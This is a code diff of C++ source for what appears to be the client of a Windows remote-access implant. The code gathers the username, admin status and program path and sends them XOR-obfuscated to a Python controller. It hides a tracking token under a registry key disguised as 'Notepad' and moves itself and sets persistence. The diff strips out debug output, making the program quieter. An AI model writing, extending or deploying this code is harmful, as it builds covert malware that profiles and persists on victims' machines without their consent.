@@ -7,34 +7,32 @@
 
 using namespace  std;
 
+
 HandShake::HandShake()
 {
-    cout << "Constructor called handsake:\n" << endl;
     a_name_user = setNameUser();
     a_is_admin = setIsAdmin();
     a_current_directory = setCurrentDirectory();
     a_name_prog = NAME_PROG;
-    cout << "----------------------------------------------\n\n" << endl;    
     a_token = getTokenOrSetTokenInRegistry();
 
-    cout << "TOKEN: " << a_token << "<------" << endl;
     a_location_prog = setLocationProg();
-    cout << "LOCATION PROG: "<<a_location_prog << endl;
-
 }
+
+
 void HandShake::setSock(int sock)
 {
     a_sock = sock;
 }
+
+
 void HandShake::beforeHandShake()
 {
     if(AUTO_MOVE) 
     {
-        cout << "[+] move prog go" << endl;
         moveProg();
     }
     a_location_prog = setLocationProg();
-    cout << "LOCATION PROG: "<<a_location_prog << endl;
     
     if(AUTO_PERSISTENCE)
     {
@@ -43,24 +41,22 @@ void HandShake::beforeHandShake()
 
 }
 
+
 void HandShake::startHandShake()
 {
     // ' SPLIT ' for split data in python server.py script
     string is_admin;
     string end = "\r\n";
 
-    cout << "\n\nSOCKET STARTHAND: " << a_sock << endl;
     if(a_is_admin)
     {
         //If admin
         is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
-        cout << "is admin in startHandShake: " << is_admin << endl;
     }
     else
     {
         //if not admin
         is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
-        cout << "is admin in startHandShake: " << is_admin << endl;
     }
     //cout << a_location_prog << endl;
     //cout << a_name_user << endl;
@@ -69,23 +65,10 @@ void HandShake::startHandShake()
     string token = "MOD_HANDSHAKE_TOKEN" SPLIT + a_token;
    
     sendUltraSafe(a_sock, XOREncryption(is_admin));
-    cout << "send admin" << endl;
-
-    //01010101001010101010101010010101010101010101001010101010
-    cout << "strlen before encrypt path prog: " << strlen(path_prog.c_str()) << endl;
-    cout << "size before encrypt path prog: " << path_prog.size() << endl;
-
     sendUltraSafe(a_sock, XOREncryption(path_prog));
-    cout << "path prog " << endl;
-
     sendUltraSafe(a_sock,XOREncryption(name_user));
-    cout << "name user" << endl;
-    
     sendUltraSafe(a_sock,XOREncryption(token));
-    cout << "tokken" << endl;
-    
     sendUltraSafe(a_sock,XOREncryption(end)); //GOOD  !
-    cout << "[++] HandShakee send all data. " << endl;
 //010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
 //010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
 
@@ -93,7 +76,7 @@ void HandShake::startHandShake()
 bool HandShake::setIsAdmin()
 {
     vector <string> result;
-    cout << "call getamdin" << endl;
+
     result = Exec().executeCommand("powershell.exe -command \"([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')\"");
     if(result[0].substr(0,4) == "True") //remove ruturn line.
     {
@@ -107,9 +90,10 @@ bool HandShake::setIsAdmin()
     }
 }
 
+
 string HandShake::setNameUser()
 {
-    cout << "call genameuser" << endl;
+
     TCHAR user[UNLEN+1];
     DWORD len_user = UNLEN+1;
     if(GetUserName(user,&len_user) == 0)
@@ -126,9 +110,10 @@ string HandShake::setNameUser()
     
 }
 
+
 string HandShake::setCurrentDirectory()
 {
-    cout << "call getcyrrentdirectory" << endl;
+
     char buffer[PATHLEN];
     _getcwd(buffer,PATHLEN);
     if(buffer == NULL)
@@ -140,6 +125,7 @@ string HandShake::setCurrentDirectory()
         return (string) buffer;
     }
 }
+
 
 string HandShake::setLocationProg()
 {
@@ -164,6 +150,7 @@ string HandShake::setLocationProg()
     }
 }
 
+
 wstring HandShake::generateToken(const int token_size)//https://www.codespeedy.com/generate-random-hexadecimal-strings-in-cpp/
 {
     wstring token;
@@ -179,11 +166,9 @@ wstring HandShake::generateToken(const int token_size)//https://www.codespeedy.c
     return token;
 }
 
+
 string HandShake::getTokenOrSetTokenInRegistry()
 {
-   // wstring token_tmp2(token_tmp.begin(), token_tmp.end());
-
-    //const WCHAR *token = wstring(token_tmp.begin(), token_tmp.end()).c_str(); //(data)
     wstring tmp_return;
 
     WCHAR name[] = L"config"; //name of string key.
@@ -223,55 +208,44 @@ string HandShake::getTokenOrSetTokenInRegistry()
     if(status != ERROR_SUCCESS)
     {
         //KEY Notepad no exist  | create key and set token.
-        cout << "[-] Key  'Notepad' not exist..." << endl;
         //HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Notepad", 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,&lpdwDisposition
         status = RegCreateKeyExW(HKEY_admin_or_not, path_of_key, 0, NULL,  REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey,NULL);
         if(status != ERROR_SUCCESS)
         {
             //if If the notepad key has not been created.  
-            cout << "[-] Key not create..." << endl;
+            ;
         }
         else
         {
-            cout << "[+] Key is create...." << endl;
+            ;
+            //cout << "[+] Key is create...." << endl;
         }
     }
-    cout << "[+] Key is open. " << endl;
+    //cout << "[+] Key is open. " << endl;
 
     //get value (string)
     status = RegQueryValueExW(hKey, name ,NULL , &lpType, (LPBYTE) buffer , &lpcbData); 
     if(status != ERROR_SUCCESS)
     {
         //string of key not found or token is not defined.
-        cout << "[-] Value not found." << endl;
-
-        cout << "hello: " << wcslen(buffer) << endl;
         ZeroMemory(&buffer, wcslen(buffer));
         cout << wcslen(buffer) << endl;
 
         wcscpy(token, generateToken(24).c_str()); //(data)
-        
-        
+                
         //set key:
         status =  RegSetValueExW(hKey, name ,0, REG_SZ, (LPBYTE) token, lpcbData);
         if(status != ERROR_SUCCESS)
         {
             //If an error lores the attribution of the token. (fuck windows)
-            cout << "FATAL ERROR" << endl;
+            //cout << "FATAL ERROR" << endl;
+            ;
         }
-        else
-        {
-            //the token was well initialized.
-            cout << "[+] the token was well initialized. " << endl;
-            wcout << "token: " << token << endl;
-        }
-        cout<< " LAST ERROR: " << GetLastError() << endl;
+        //the token was well initialized.
     }
 
     else
     {
-        wcout << "TOKEN: " << buffer  << "<-0101010" << endl;
-        
         tmp_return = buffer;
         return string(tmp_return.begin(), tmp_return.end());
     }
@@ -311,13 +285,10 @@ string HandShake::getToken()
 void HandShake::moveProg()
 {
    // Deplace le programme en fonction des privilèges de l'utilisateur.
-    cout << "name prog : " << a_name_prog << endl;
-    cout << "Location prog: " << a_location_prog << endl;
     if(a_is_admin)
     {   
         if((rename(a_name_prog.c_str(), (a_location_prog).c_str())!=0))
         {   
-            perror("Error in move prog ");
             a_location_prog = a_current_directory + "\\" + a_name_prog; //if error
         }
     }
